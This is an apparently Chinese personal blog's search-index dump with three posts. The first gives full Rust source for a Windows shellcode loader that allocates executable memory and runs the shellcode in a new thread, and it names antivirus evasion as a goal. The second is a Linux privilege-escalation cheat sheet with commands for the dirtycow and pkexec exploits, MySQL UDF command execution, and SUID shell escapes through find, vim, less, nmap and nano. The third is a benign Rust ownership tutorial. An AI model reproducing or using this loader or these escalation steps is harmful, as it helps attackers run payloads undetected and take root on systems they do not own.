[{"categories":null,"content":"My only wish is to die at the right time. ","date":"2022-06-12","objectID":"/about/:0:0","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"​ 突发奇想用rust写一个shellcode加载器,花了两天研究了思路和大佬的代码. 项目地址:https://github.com/fumerem/shellcode_loader ","date":"2022-06-12","objectID":"/posts/2022/06/12/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/:0:0","tags":null,"title":"rust编写shellcode加载器","uri":"/posts/2022/06/12/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/"},{"categories":null,"content":"0x00 shellcode加载器原理 shellcode:一段16进制的机器码,后渗透中经常使用它来得到shell而得名. 加载器原理:为shellcode分配动态内存,并创建进程执行shellcode ","date":"2022-06-12","objectID":"/posts/2022/06/12/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/:1:0","tags":null,"title":"rust编写shellcode加载器","uri":"/posts/2022/06/12/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/"},{"categories":null,"content":"0x01 加载器的编写 先列举一下加载器需要调用的windows的api ","date":"2022-06-12","objectID":"/posts/2022/06/12/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/:2:0","tags":null,"title":"rust编写shellcode加载器","uri":"/posts/2022/06/12/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/"},{"categories":null,"content":"VistualAlloc 申请内存 LPVOID VirtualAlloc { ​ LPVOID lpAddress, #要分配的内存区域的地址 ​ DWORD dwSize, #分配的大小 ​ DWORD flAllocationType, #分配的类型 ​ DWORD flProtect #该内存的初始保护属性 }; 代码实现 unsafe { memory.ptr = Memory::VirtualAlloc( ptr::null(), //memory address to distribute len, //memory size Memory::MEM_COMMIT | Memory::MEM_RESERVE, //alloc type Memory::PAGE_EXECUTE_READWRITE, //protect attribute ) as *mut u8; }; ","date":"2022-06-12","objectID":"/posts/2022/06/12/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/:2:1","tags":null,"title":"rust编写shellcode加载器","uri":"/posts/2022/06/12/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/"},{"categories":null,"content":"CreateThread 创建进程调用CreateThread将在主线程的基础上创建一个新线程CreateThread HANDLE CreateThread ( ​ LPSECURITY_ATTRIBUTES lpThreadAttributes,#线程安全属性 ​ SIZE_T dwStackSize, #置初始栈的大小，以字节为单位 ​ LPTHREAD_START_ROUTINE lpStartAddress, #指向线程函数的指针 ​ LPVOID lpParameter, #向线程函数传递的参数 ​ DWORD dwCreationFlags, #线程创建属性 ​ LPDWORD lpThreadId #保存新线程的id ) 代码实现 th.handle = Threading::CreateThread( ptr::null_mut(), //thread protect attribute 0, //stack attribute Some(ep), //pointer to thread func ptr::null_mut(), //prama to thread func windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0), //thread create flags \u0026mut th.tid, //thread id ).unwrap(); ","date":"2022-06-12","objectID":"/posts/2022/06/12/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/:2:2","tags":null,"title":"rust编写shellcode加载器","uri":"/posts/2022/06/12/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/"},{"categories":null,"content":"VirtualFree VirtualFreeEx{编辑 播报 ​ HANDLE hProcess, // 要释放内存所在进程的句柄 ​ LPVOID lpAddress, // 区域地址 ​ DWORD dwSize, // 区域大小，字节 ​ DWORD dwFreeType //类型 }; 代码实现 Memory::VirtualFree(self.ptr as *mut c_void, 0, Memory::MEM_RELEASE); lib.rs全部代码 use std::ptr; use std::slice; use std::mem; use std::ffi::c_void; use windows::Win32::System::Memory; use windows::Win32::Foundation; use windows::Win32::Foundation::WIN32_ERROR; use windows::Win32::System::Threading; use windows::Win32::System::WindowsProgramming; pub struct DistributeMemory { len: usize, ptr: *mut u8, } impl Drop for DistributeMemory { fn drop(\u0026mut self) { unsafe{ Memory::VirtualFree(self.ptr as *mut c_void, 0, Memory::MEM_RELEASE); } } } impl DistributeMemory { fn new(len: usize) -\u003e Result\u003cDistributeMemory, WIN32_ERROR\u003e { let mut memory = DistributeMemory { len, ptr: ptr::null_mut(), }; unsafe { memory.ptr = Memory::VirtualAlloc( ptr::null(), //memory address to distribute len, //memory size Memory::MEM_COMMIT | Memory::MEM_RESERVE, //alloc type Memory::PAGE_EXECUTE_READWRITE, //protect attribute ) as *mut u8; }; if memory.ptr.is_null() { Err( unsafe{ Foundation::GetLastError()} ) } else { Ok(memory) } } pub fn as_slice_mut(\u0026mut self) -\u003e \u0026mut[u8] { unsafe { slice::from_raw_parts_mut(self.ptr, self.len) }//turn pointer to mut slice } pub fn as_ptr(\u0026self) -\u003e *mut u8 { self.ptr } } pub struct Thread { handle: Foundation::HANDLE, tid: u32, } impl Drop for Thread { fn drop(\u0026mut self) { unsafe { Foundation::CloseHandle(self.handle) }; } } impl Thread { pub unsafe fn run(start: *const u8) -\u003e Result\u003cThread, WIN32_ERROR\u003e { let mut th = Thread { handle: Foundation::HANDLE(0), tid: 0, }; let ep: extern \"system\" fn(*mut c_void) -\u003e u32 = { std::mem::transmute(start) }; th.handle = Threading::CreateThread( ptr::null_mut(), //thread protect attribute 0, //stack attribute Some(ep), //pointer to thread func ptr::null_mut(), //prama to thread func windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0), //thread create flags \u0026mut th.tid, //thread id ).unwrap(); if th.handle == Foundation::HANDLE(0) { Err(Foundation::GetLastError()) } else { Ok(th) } } pub fn wait(\u0026self) -\u003e Result\u003c(), WIN32_ERROR\u003e { let status = unsafe { Threading::WaitForSingleObject(self.handle, WindowsProgramming::INFINITE) }; if status == 0 { Ok(()) } else { Err( unsafe{Foundation::GetLastError()} ) } } } pub fn run(shellcode: Vec\u003cu8\u003e) -\u003e Result\u003c(), WIN32_ERROR\u003e { let mut me = DistributeMemory::new(shellcode.len())?; let ms = me.as_slice_mut(); ms[..shellcode.len()].copy_from_slice(shellcode.as_slice()); let t = unsafe { Thread::run(me.as_ptr()) }?; t.wait() } ","date":"2022-06-12","objectID":"/posts/2022/06/12/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/:2:3","tags":null,"title":"rust编写shellcode加载器","uri":"/posts/2022/06/12/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/"},{"categories":null,"content":"0x02 存在的缺陷 ​ 由于使用的是指定成员数量的切片,在main.rs中复制粘贴时必须改变[u8]的数量. 免杀功能仍须改进 ","date":"2022-06-12","objectID":"/posts/2022/06/12/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/:3:0","tags":null,"title":"rust编写shellcode加载器","uri":"/posts/2022/06/12/rust%E7%BC%96%E5%86%99shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/"},{"categories":null,"content":"0x00 信息收集 lsb_release -a 查看系统发行版本 uname -a 查看内核版本 whoami 检测当前用户权限 0x01 内核提权 ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:0:0","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"CVE-2021-4034 pkexec 本地提权 https://github.com/berdav/CVE-2021-4034 centos和ubuntu通杀 ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:1:0","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"脏牛提权-CVE-2016-5195 条件: linux内核=\u003e2.6.22 https://github.com/FireFart/dirtycow gcc -pthread dirty.c -o dirty -lcrypt ./dirty mv /tmp/passwd.bak /etc/passwd ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:2:0","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"CVE-2017-16995 影响版本: Linux Kernel Version 4.14-4.4 仅影响Ubuntu/Debian发行版本 https://github.com/Al1ex/CVE-2017-16995 gcc exploit.c -o exploit ./exploit ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:3:0","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"LINENUM.SH（本地LINUX枚举和提权辅助脚本） 帮助提取linux系统信息 https://github.com/rebootuser/LinEnum chmod +x /tmp/LinEnum.sh sh /tmp/LinEnum.sh \u0026gt; /tmp/getinfo.txt ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:4:0","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"linux-exploit-suggester2 https://github.com/jondonas/linux-exploit-suggester-2 帮助查看系统存在的提取漏洞 perl linux-exploit-suggester-2.pl ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:5:0","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"kali searchexploit ​ searchsploit是一个用于Exploit-DB的命令行搜索工具，可以帮助我们查找渗透模块。 语法 searchsploit [options] term1 [term2] … [termN] searchsploit [选项] 关键字1 [关键字2] … [关键字N] 选项 -c, –case[Term]执行区分大小写的搜索，缺省是对大小写不敏感。 -e, –exact [Term]对exploit标题执行EXACT匹配（默认为AND） -h, –help在屏幕上显示帮助 -j, –json[Term]以JSON格式显示结果 -m, –mirror [EDB-ID]将一个漏洞利用镜像（副本）到当前工作目录，后面跟漏洞ID号 -o, –overflow [Term]Exploit标题被允许溢出其列 -p, –path[EDB-ID]显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号 -t, –title[Term]仅仅搜索漏洞标题（默认是标题和文件的路径） -u, –update检查并安装任何exploitdb软件包更新（deb或git） -w, –www [Term]显示Exploit-DB.com的URL而不是本地路径（在线搜索） -x, –examine[EDB-ID]使用$ PAGER检查（副本）漏洞利用 -v –verbose 显示更多的输出信息 –colour在搜索结果中禁用颜色突出显示. –id显示EDB-ID值而不是本地路径 –nmap[file.xml]使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml） 0x02 Mysql提权 前提条件: 知道mysql用户名和密码,可以远程执行命令 mysql有写入文件的权限 ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:6:0","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"1.查看mysql有写入文件的权限 show global variables like '%secure%'; secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制 若secure_file_priv不为空白,可以在mysql/my.ini中修改 secure_file_priv = ' ' 然后重启apache服务 查看plugin位置 show variables like 'plugin%'; 查看数据库和服务器架构信息 select @@version_compile_os, @@version_compile_machine; ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:7:0","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"2.上传\u0026写入动态链接库 1.Mysql版本大于5.1，plugin文件夹默认不存在，需要自行创建lib/plugin #若失败，更改my.ini，添加plugin_dir=C:/或者C:/System32 2.Mysql版本小于5.1： 如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导到 C:\\Winnt\\udf.dll 下。 如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\\Windows\\udf.dll 下。 ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:8:0","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"上传 利用sqlmap或者大马直接传输udf.dll,没什么好说的 ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:8:1","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"写文件 create table temp(data longblob); select 0x0....(16进制字节) INTO DUMPFILE 'C:\\\\udf.dll'; 国光师傅已经归纳好了 https://www.sqlsec.com/tools/udf.html ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:8:2","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"3.创建自定义函数 create table temp(data longblob); select 0x0.... INTO DUMPFILE 'C:\\\\udf.dll'; create function sys_eval returns string soname 'udf.dll'; #创建函数sys_eval select * from mysql.func where name = 'sys_eval'; #查看创建的sys_eval函数 select sys_eval('whoami'); 0x03 SUID提权 ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:9:0","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"1.什么是SUID SUID(SET UID)是linux的一种特殊权限,当权限为suid的程序作为进程运行时,它的属主不是进程发起者,而是程序文件的所有者.(只针对二进制可执行文件) 比如在非root权限的条件下运行find程序,而find程序的所有者是root,我们就能短暂地执行root的命令,该进程的权限即为root. 设置SUID chmod u+s filename 设置SUID位 chmod u-s filename 去掉SUID设置 ls -al 查看文件权限 ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:10:0","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"2.利用SUID提权 常见的拥有SUID的程序有 nmap vim find bash more less nano cp awk 查看拥有SUID权限的文件,皆可. find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {}; 查看文件权限 可见,权限为suid且所有者为root ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:11:0","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"nmap(2.02~5.02) 早期nmap带有交互模式,运行执行shell命令 nmap --interactive nmap\u003e !sh sh-3.2# whoami root ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:11:1","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"find touch demo find demo -exec whoami \\; find demo -exec '/bin/sh' \\; ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:11:2","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"vim vim/vi :shell ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:11:3","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"less/more less /etc/passwd !/bin/sh ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:11:4","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"bash less /etc/passwd !/bin/sh ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:11:5","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"nano nano #进入nano编辑器 Ctrl + R Ctrl + X 即可输入命令 ","date":"2022-05-25","objectID":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/:11:6","tags":null,"title":"列举常见linux提权方式","uri":"/posts/2022/05/25/%E5%88%97%E4%B8%BE%E5%B8%B8%E8%A7%81linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/"},{"categories":null,"content":"rust有一处特殊的地方，所有权。 ","date":"2022-04-19","objectID":"/posts/2022/04/19/%E4%BB%8E%E5%BA%95%E5%B1%82%E4%BA%86%E8%A7%A3rust%E7%9A%84%E6%89%80%E6%9C%89%E6%9D%83%E6%9C%BA%E5%88%B6/:0:0","tags":null,"title":"从底层了解rust的所有权机制","uri":"/posts/2022/04/19/%E4%BB%8E%E5%BA%95%E5%B1%82%E4%BA%86%E8%A7%A3rust%E7%9A%84%E6%89%80%E6%9C%89%E6%9D%83%E6%9C%BA%E5%88%B6/"},{"categories":null,"content":"0x00 C++和rust的区别 先看c++ #include \u003ciostream\u003e using namespace std; int main() { string str1 = \"hello\"; string str2 = str1; cout \u003c\u003c str1 \u003c\u003c str2; } 声明字符串str1，将str1的值赋值给str2，然后打印str1，str2，编译没有问题。 再看rust fn main() { let a = String::from(\"hello\"); let b = a; println!(\"{} {}\", a, b) } 编译一下 好的，报错了，怎么回事呢。a的所有权已经移交给b，所以无法借用a。 那么rust为什么要这么设计，不麻烦吗？ ","date":"2022-04-19","objectID":"/posts/2022/04/19/%E4%BB%8E%E5%BA%95%E5%B1%82%E4%BA%86%E8%A7%A3rust%E7%9A%84%E6%89%80%E6%9C%89%E6%9D%83%E6%9C%BA%E5%88%B6/:1:0","tags":null,"title":"从底层了解rust的所有权机制","uri":"/posts/2022/04/19/%E4%BB%8E%E5%BA%95%E5%B1%82%E4%BA%86%E8%A7%A3rust%E7%9A%84%E6%89%80%E6%9C%89%E6%9D%83%E6%9C%BA%E5%88%B6/"},{"categories":null,"content":"0x01 为什么设计所有权 ​ 当今计算机内存栈和堆的分配机制，决定了编程语言中的值主要分两类：值类型（Value）和引用类型（Reference）。 ​ 值类型：数据直接存储在栈中的数据类型，比如数值，布尔值，结构体。因为在栈中，操作效率比较高。值类型作为右值执行赋值时，会自动复制一个新副本。 ​ 引用类型：数据存储在堆中，栈中储存值的地址（指针），比如数组，字符串。操作效率一般比较低。像java，python等语言用GC回收，c，c++等系统语言须程序员手动回收。 ​ 随着编程语言的发展，类型越来愈丰富，值类型和引用类型已无法完美描述类型。比如Vector容器类型，内部可以包含数值类型，也可以包含引用类型，它怎么分类？ ​ 之后便引出了：值语义（Value Semantic）和引用语义（Reference Semantic） ​ 值语义：按位复制后，与原始对象无关 ​ 引用语义：也称指针语义。一般指数据存放堆上，通过栈上的指针来管理堆中数据，并且引用语义禁止按位复制 ​ 值语义保证了数据的独立性，如果想修改一个值，只能通过修改它自身来修改，无法通过修改它的复制品来修改。而引用语义禁止按位复制，因为按位复制只能复制栈上的指针，存放在堆的数值同时存在两个指针对它管理，影响内存安全。 fn main() { let x = 100; let y = x; assert_eq!(x, 100); assert_eq!(y, 100); } ​ x为整型，它作为右值赋值给y，编译器默认调用x的clone进行按位复制。复制完成后，y和x互相独立，互不影响。整型实现了Copy trait，其clone方法必须是按位复制的，不会对原数据造成破坏，不存在内存安全的问题。而C++，如果开发者疏忽，就可能存在内存安全问题。 #[derive(Copy, Clone)] struct A { a: i32, b: Box\u003ci32\u003e, } fn main() {} ​ 智能指针Box是典型的引用类型，无法实现Copy，禁止实现按位复制（可以使用clone显式复制进行深调用）。 ","date":"2022-04-19","objectID":"/posts/2022/04/19/%E4%BB%8E%E5%BA%95%E5%B1%82%E4%BA%86%E8%A7%A3rust%E7%9A%84%E6%89%80%E6%9C%89%E6%9D%83%E6%9C%BA%E5%88%B6/:2:0","tags":null,"title":"从底层了解rust的所有权机制","uri":"/posts/2022/04/19/%E4%BB%8E%E5%BA%95%E5%B1%82%E4%BA%86%E8%A7%A3rust%E7%9A%84%E6%89%80%E6%9C%89%E6%9D%83%E6%9C%BA%E5%88%B6/"},{"categories":null,"content":"0x02 所有权机制 ​ rust使用Copy Trait来区分值语义和引用语义，同时使用引入新语义：复制（Copy）和移动（Move），保证内存安全和性能。 ​ 对于可以安全地在栈上按位复制的类型，只需按位复制。对于堆上的类型，无法安全地在栈上按位复制，若想保证内存安全，只能深复制（在栈上重新开辟内存，带来性能开销）。若堆上数据不变，只在栈上移动指针位置，那就同时实现了内存安全和高性能。 fn main() { let x = Box::new(100); let y = x; assert_eq!(y, 100); //println!(\"{}\", x) ERROR!!! } ​ 以上，没有发生按位移动，只是将x的指针指向了y，杜绝了堆上同一值存在两个指针的情况，保证了内存安全。起初x对Box拥有所有权，之后x的所有权转移给了y，最终由y释放Box的堆内存。 ​ 一个值的所有权被转移给另外一个变量绑定的过程，称为所有权转移。 ​ Rust中每个值都有一个所有者，更进一步说就是，Rust中分配的每块内存都有其所有者，所有者负责该内存的释放和读写权限，并且每次每个值只能有唯一的所有者。这就是 Rust的所有权机制（OwnerShip）。 ","date":"2022-04-19","objectID":"/posts/2022/04/19/%E4%BB%8E%E5%BA%95%E5%B1%82%E4%BA%86%E8%A7%A3rust%E7%9A%84%E6%89%80%E6%9C%89%E6%9D%83%E6%9C%BA%E5%88%B6/:3:0","tags":null,"title":"从底层了解rust的所有权机制","uri":"/posts/2022/04/19/%E4%BB%8E%E5%BA%95%E5%B1%82%E4%BA%86%E8%A7%A3rust%E7%9A%84%E6%89%80%E6%9C%89%E6%9D%83%E6%9C%BA%E5%88%B6/"}]